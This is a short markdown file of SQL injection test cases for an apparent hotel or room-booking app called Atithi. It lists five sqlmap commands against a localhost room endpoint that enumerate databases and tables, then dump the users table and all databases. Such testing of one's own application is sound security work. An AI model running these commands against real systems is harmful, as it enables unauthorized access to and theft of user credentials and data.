# SQL Injection test cases for Atithi

## Injection in get_rooms.php
```bash
sqlmap -u "http://localhost:8000/api/rooms/get_room.php?id=1" --dbs --batch
```
## Finding Database and Tables
```bash
sqlmap -u "http://localhost:8000/api/rooms/get_room.php?id=1" --tables --batch
```
## Check User Table existence and dump data
```bash
sqlmap -u "http://localhost:8000/api/rooms/get_room.php?id=1" -D public -T users --columns --batch
```
## Dumping data from users table
```bash
sqlmap -u "http://localhost:8000/api/rooms/get_room.php?id=1" -D public -T users --dump --batch
```
## All Database Dump
```bash
sqlmap -u "http://localhost:8000/api/rooms/get_room.php?id=1" --dump-all --batch
```